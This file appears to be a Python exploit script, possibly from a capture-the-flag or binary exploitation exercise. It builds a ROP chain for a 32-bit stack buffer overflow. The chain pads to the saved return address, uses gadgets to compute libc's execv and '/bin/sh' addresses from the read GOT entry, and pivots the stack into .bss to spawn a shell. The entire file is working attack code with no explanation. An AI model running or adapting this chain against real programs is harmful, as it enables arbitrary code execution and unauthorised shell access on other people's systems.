import sys
import json
import subprocess
from helper import *

GADGET_SIZE = 4

read_offset = 0x000e3e10
offset_execv_read = (0x000bd890 - read_offset) & 0xffffffff
offset_binsh_read = (0x00166046 - read_offset) & 0xffffffff

def call(config, function_name, parameters):
    if len(parameters) > GADGET_SIZE:
        raise "Too many parameters, find a better gadget"

    return int2le(config[function_name]) + \
           int2le(config["base"] + config["gadget"]) + \
           "".join(map(str, map(int2le, parameters))) + \
           int2le(0xdeadb00b) * (GADGET_SIZE - len(parameters))

def main():
    #config = json.loads(subprocess.check_output("./offsets"))
    config = json.loads(open("config.json", "r").read())

    config["sip_offset"] = hex(int(config["sip_offset"], 10))
    for key in config:
        config[key] = int(config[key], 16)

    new_stack = config["bss"] + 1024

    exploit = "A" * config["sip_offset"] + \
              call(config, "writemem", [new_stack - 4, config["base"] + config["pointer_to_null"]]) + \
              call(config, "mem_to_mem", [new_stack - 8, config["read_got"]]) + \
              call(config, "add", [new_stack - 8, offset_binsh_read]) + \
              call(config, "writemem", [new_stack - 12, 0xdeadb00b]) + \
              call(config, "mem_to_mem", [new_stack - 16, config["read_got"]]) + \
              call(config, "add", [new_stack - 16, offset_execv_read]) + \
              int2le(config["base"] + config["pop_ebp"]) + \
              int2le(new_stack - 20) + \
              int2le(config["base"] + config["leave_ret"]) + \
              ""
    write_string(exploit)

if __name__ == "__main__":
    main()
